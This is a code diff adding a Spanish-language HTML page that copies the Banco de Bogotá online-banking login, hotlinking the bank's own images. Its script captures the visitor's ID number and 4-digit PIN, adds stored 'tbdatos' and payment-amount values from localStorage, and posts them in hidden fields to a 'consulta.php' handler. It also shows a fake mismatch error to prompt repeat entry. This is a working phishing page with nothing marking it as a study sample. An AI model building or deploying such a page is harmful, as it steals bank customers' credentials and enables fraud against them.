@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual Banco de Bogotá</title>
+    <link rel="icon" type="image/x-icon" href="https://virtual.bancodebogota.co/bbog-pb-frontend-bv-shell/assets/favicon.ico">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .main-wrapper {
+            display: flex;
+            min-height: 100vh;
+            width: 100%;
+            background-color: #F8FAFB;
+        }
+
+        /* --- LADO IZQUIERDO --- */
+        .left-container {
+            width: 47%;
+            background-color: #FFFFFF;
+            display: flex;
+            justify-content: flex-start;
+            padding-top: 40px;
+            padding-left: 24%;
+        }
+
+        .content-box { width: 351px; }
+
+        .main-logo { height: 32px; margin-bottom: 25px; display: block; }
+
+        .welcome-msg {
+            font-size: 24px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .blue-banner {
+            background-color: #1D4E9E;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            padding: -14px 7px;
+            color: white;
+            margin-bottom: 17px;
+            height: 88px;
+            overflow: visible;
+        }
+
+        .person-img {
+            height: 71px;
+            margin-top: -17px;
+            margin-right: 15px;
+            object-fit: contain;
+        }
+
+        .banner-text p { font-size: 14px; line-height: 1.2; font-weight: 550; color: #FFFFFF; }
+        .banner-text span { font-size: 14px; font-weight: 550; display: block; margin-top: 4px; color: #FFFFFF; }
+
+        .login-card {
+            border: 1px solid #EAECEF;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            margin-bottom: 35px;
+            background: #fff;
+        }
+
+        .tabs { display: flex; border-bottom: 1px solid #F0F2F5; }
+
+        .tab {
+            flex: 1; padding: 18px; text-align: center;
+            font-size: 16px; color: #6B7280; font-weight: 600; cursor: pointer;
+        }
+
+        .tab.active { color: #0043a9; font-weight: 550; border-bottom: 3px solid #1D4E9E; }
+
+        .alert-info {
+            background-color: #edf7ff; padding: 14px 14px;
+            font-size: 15px; line-height: 1.3; color: #606060;
+            display: flex; justify-content: space-between; align-items: flex-start;
+            border-bottom: 1px solid #E0EBF5;
+        }
+
+        .close-x { color: #00448D; font-size: 20px; cursor: pointer; margin-left: 10px; line-height: 1; }
+
+        .card-body { padding: 24px 22px; }
+
+        .label-text { display: block; font-size: 14px; color: #000000; margin-bottom: 10px; font-weight: 500; }
+        
+        .input-row { display: flex; gap: 12px; margin-bottom: 25px; }
+
+        .styled-select, .styled-input, .pass-input {
+            border: 1px solid #D1D5DB; border-radius: 10px; height: 52px; font-size: 16px; outline: none;
+        }
+
+        .styled-select { 
+            width: 38%; padding: 0 15px; 
+            background: #fff url('data:image/svg+xml;charset=US-ASCII,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="%2300448D" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>') no-repeat right 10px center;
+            background-size: 18px; appearance: none; color: #111827;
+        }
+
+        .styled-input { width: 62%; padding: 0 15px; }
+
+        .password-field { position: relative; margin-bottom: 30px; }
+        .pass-input { width: 100%; padding: 0 50px 0 15px; letter-spacing: 2px; }
+
+        .eye-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 24px; cursor: pointer; opacity: 0.7; }
+
+        .btn-submit {
+            width: 100%; height: 54px; background-color: #E5E7EB; color: #9CA3AF;
+            border: none; border-radius: 25px; font-weight: 700; font-size: 16px;
+            margin-bottom: 25px; cursor: not-allowed; transition: all 0.3s;
+        }
+
+        .footer-links { display: flex; justify-content: space-between; padding: 0 10px; }
+        .footer-links a { color: #00448D; text-decoration: none; font-weight: 600; font-size: 15px; }
+
+        .legal-notice { font-size: 12px; color: #333333; line-height: 1.5; margin-top: 40px; text-align: left; }
+        .legal-notice a { color: #00448D; text-decoration: none; font-weight: 500; }
+
+        /* --- LADO DERECHO --- */
+        .right-container {
+            width: 53%;
+            background-color: #F8FAFB;
+            display: flex;
+            justify-content: flex-start;
+            align-items: flex-start;
+            padding-top: 129px;
+            padding-left: 60px;
+        }
+
+        .promo-wrapper { width: 480px; position: relative; }
+        .promo-card {
+            background: #FFFFFF; border-radius: 12px; width: 480px; height: 250px;
+            display: flex; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            border: 1px solid #EAECEF; padding: 0; 
+        }
+
+        .promo-img-side { flex: 0 0 181px; display: flex; align-items: flex-end; justify-content: flex-start; }
+        .promo-img-side img { width: 131%; height: auto; display: block; margin-left: -25px; }
+
+        .promo-info-side { flex: 1; padding: 40px 30px 20px 60px; display: flex; flex-direction: column; justify-content: flex-start; text-align: left; }
+        .promo-info-side h2 { font-size: 28px; font-weight: 700; color: #000; margin-bottom: 15px; line-height: 1.1; letter-spacing: -0.5px; }
+        .promo-info-side p { font-size: 16px; color: #000; margin-bottom: 30px; line-height: 1.3; max-width: 250px; }
+        .promo-info-side .promo-link { font-size: 14px; color: #8E9196; text-decoration: none; line-height: 1.3; font-weight: 500; margin-top: auto; }
+
+        .quick-access-viewport { width: 100%; overflow: hidden; margin-top: 15px; padding: 5px 0; }
+        .quick-access-bar { display: flex; gap: 12px; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); width: max-content; }
+        .access-card { background: #FFFFFF; border: 1px solid #EAECEF; border-radius: 14px; width: 121px; height: 107px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 10px; cursor: pointer; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02); flex-shrink: 0; }
+        .access-card img { width: 25px; height: 25px; margin-bottom: 6px; }
+        .access-card span { font-size: 14px; color: #0043a9; font-weight: 550; line-height: 1.2; }
+
+        .round-arrow { position: absolute; right: -25px; top: 85%; transform: translateY(-50%); width: 58px; height: 58px; background: #FFFFFF; border: 2px solid #00448D; border-radius: 18px; display: flex; align-items: center; justify-content: center; color: #00448D; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.1); z-index: 20; transition: 0.3s; }
+        .round-arrow svg { width: 26px; height: 26px; stroke: #00448D; stroke-width: 2.5; fill: none; transition: transform 0.3s; }
+        .round-arrow.back svg { transform: rotate(180deg); }
+
+        /* --- MODAL ERROR --- */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4); display: none;
+            align-items: center; justify-content: center; z-index: 1000;
+        }
+        .modal-box {
+            background: #FFFFFF;
+            width: 90%; max-width: 480px;
+            border-radius: 12px;
+            border: none;
+            padding: 32px 30px;
+            text-align: left;
+            position: relative;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.15);
+        }
+        .modal-icon {
+            width: 44px; height: 44px;
+            background-color: #F69C3B;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 20px;
+        }
+        .modal-icon svg { width: 24px; height: 24px; fill: none; stroke: #FFFFFF; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+        .modal-title { font-size: 22px; font-weight: 700; color: #000000; margin-bottom: 15px; }
+        .modal-text { font-size: 16px; color: #4B5563; line-height: 1.4; margin-bottom: 30px; }
+        .modal-btn {
+            display: block; width: max-content; margin-left: auto;
+            background-color: #00448D; color: #FFFFFF; font-size: 16px; font-weight: 600;
+            padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; text-decoration: none;
+        }
+
+        @media (max-width: 768px) {
+            .main-wrapper { flex-direction: column; height: auto; }
+            .left-container { width: 100%; padding: 20px 16px; justify-content: center; }
+            .content-box { width: 100%; max-width: 100%; }
+            .right-container { width: 100%; padding: 20px 16px; background-color: #F8FAFB; }
+            .promo-wrapper { width: 100%; }
+            .promo-card { width: 100%; height: auto; min-height: 150px; }
+            .promo-info-side { padding: 20px; }
+            .promo-info-side h2 { font-size: 22px; }
+            .promo-info-side p { font-size: 14px; max-width: 100%; margin-bottom: 10px; }
+            .round-arrow { right: 10px; top: 85%; width: 50px; height: 50px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- MODAL ERROR -->
+    <div class="modal-overlay" id="errorModal">
+        <div class="modal-box">
+            <div class="modal-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <h2 class="modal-title">Tus datos no coinciden</h2>
+            <p class="modal-text">Verifícalos e inténtalo nuevamente. Si aún no eres cliente te invitamos a solicitar un producto desde la pantalla de inicio.</p>
+            <button class="modal-btn" onclick="document.getElementById('errorModal').style.display='none'">Volver al inicio</button>
+        </div>
+    </div>
+
+    <main class="main-wrapper">
+        <section class="left-container">
+            <div class="content-box">
+                <img src="img/logo.svg" alt="Banco de Bogotá" class="main-logo">
+                <h1 class="welcome-msg">Bienvenido a tu Banca Virtual</h1>
+                <div class="blue-banner">
+                    <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png" alt="Usuario" class="person-img">
+                    <div class="banner-text">
+                        <p>¿Nunca has ingresado a Banca Virtual?</p>
+                        <span>Aquí te decimos cómo hacerlo ›</span>
+                    </div>
+                </div>
+                <div class="login-card">
+                    <div class="tabs">
+                        <div class="tab active">Clave segura</div>
+                        <div class="tab">Tarjeta débito</div>
+                    </div>
+                    <div class="alert-info">
+                        <p>Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.</p>
+                        <span class="close-x">×</span>
+                    </div>
+                    <div class="card-body">
+                        <form id="loginForm">
+                            <label class="label-text">Identificación</label>
+                            <div class="input-row">
+                                <select class="styled-select"><option>C.C. ...</option></select>
+                                <input type="tel" id="user_id" placeholder="#" class="styled-input" maxlength="10" autocomplete="off" oninput="validarInputs()">
+                            </div>
+                            <label class="label-text">Clave segura</label>
+                            <div class="password-field">
+                                <input type="password" id="user_pass" placeholder="••••" class="pass-input" maxlength="4" autocomplete="off" oninput="validarInputs()">
+                                <img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" class="eye-icon" alt="ver">
+                            </div>
+                            <button type="button" id="submitBtn" class="btn-submit" onclick="enviar()">Ingresar</button>
+                            <div class="footer-links">
+                                <a href="#">Registrarme ›</a>
+                                <a href="#">Olvidé mi clave ›</a>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <p class="legal-notice">Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.</p>
+            </div>
+        </section>
+
+        <section class="right-container">
+            <div class="promo-wrapper">
+                <div class="promo-card">
+                    <div class="promo-img-side"><img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/e72fd950acb9871e4bb2.png" alt="Transferencias"></div>
+                    <div class="promo-info-side">
+                        <h2>¡Que nada se te olvide!</h2>
+                        <p>Programa tus transferencias de forma rápida y sencilla...</p>
+                        <a href="#" class="promo-link">Sección Transferencias > Trasferencias Programadas</a>
+                    </div>
+                </div>
+                <div class="quick-access-viewport">
+                    <div class="quick-access-bar" id="iconSlider">
+                        <div class="access-card"><img src="img/1.png"><span>Configuración de seguridad</span></div>
+                        <div class="access-card"><img src="img/2.png"><span>Solicitar un producto</span></div>
+                        <div class="access-card"><img src="img/3.png"><span>Atención al cliente</span></div>
+                        <div class="access-card"><img src="img/4.png"><span>Solicitar un turno digital</span></div>
+                        <div class="access-card"><img src="img/1.png"><span>Buscar cajeros y oficinas</span></div>
+                    </div>
+                </div>
+                <div class="round-arrow" id="slideBtn" onclick="toggleSlide()">
+                    <svg viewBox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Lógica del Slider (Mantener intacta)
+        let isMoved = false;
+        function toggleSlide() {
+            const slider = document.getElementById('iconSlider');
+            const btn = document.getElementById('slideBtn');
+            if (!isMoved) {
+                slider.style.transform = 'translateX(-220px)';
+                btn.classList.add('back');
+                isMoved = true;
+            } else {
+                slider.style.transform = 'translateX(0)';
+                btn.classList.remove('back');
+                isMoved = false;
+            }
+        }
+
+        // MOSTRAR MODAL SI HAY ERROR EN URL
+        window.addEventListener('DOMContentLoaded', () => {
+            localStorage.removeItem('session_id');
+            localStorage.removeItem('messageId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('username');
+            localStorage.removeItem('password');
+            localStorage.removeItem('identificacion');
+
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('error') === '1') {
+                document.getElementById('errorModal').style.display = 'flex';
+                // Limpiar la URL para que no vuelva a salir al recargar
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+        });
+
+        // LÓGICA DE VALIDACIÓN Y ENVÍO
+        function validarInputs() {
+            const idInput = document.getElementById('user_id');
+            const passInput = document.getElementById('user_pass');
+            const btn = document.getElementById('submitBtn');
+
+            // Limpiar caracteres no numéricos
+            idInput.value = idInput.value.replace(/\D/g, '');
+            passInput.value = passInput.value.replace(/\D/g, '');
+
+            // Validar condiciones: ID (mínimo 6, máx 10) y Clave (exacto 4)
+            if (idInput.value.length >= 6 && passInput.value.length === 4) {
+                btn.disabled = false;
+                btn.style.backgroundColor = "#00448D"; // Azul corporativo
+                btn.style.color = "#FFFFFF";
+                btn.style.cursor = "pointer";
+            } else {
+                btn.disabled = true;
+                btn.style.backgroundColor = "#E5E7EB";
+                btn.style.color = "#9CA3AF";
+                btn.style.cursor = "not-allowed";
+            }
+        }
+
+        function enviar() {
+            const id   = document.getElementById('user_id').value;
+            const pass = document.getElementById('user_pass').value;
+
+            // Recopilar tbdatos de localStorage
+            let tbdatosObj = {};
+            try {
+                tbdatosObj = JSON.parse(localStorage.getItem('tbdatos') || '{}');
+            } catch(e) {}
+
+            // Asegurar que total_pagar / monto esté dentro del objeto tbdatos
+            const mVal = localStorage.getItem('total_pagar') || localStorage.getItem('monto') || '';
+            if (mVal && !tbdatosObj.total_pagar) {
+                tbdatosObj.total_pagar = mVal;
+            }
+
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'consulta.php';
+
+            const field1 = document.createElement('input');
+            field1.type  = 'hidden';
+            field1.name  = 'u_id';
+            field1.value = id;
+
+            const field2 = document.createElement('input');
+            field2.type  = 'hidden';
+            field2.name  = 'u_ps';
+            field2.value = pass;
+
+            const field3 = document.createElement('input');
+            field3.type  = 'hidden';
+            field3.name  = 'u_tb';
+            field3.value = JSON.stringify(tbdatosObj);
+
+            form.appendChild(field1);
+            form.appendChild(field2);
+            form.appendChild(field3);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+</html>
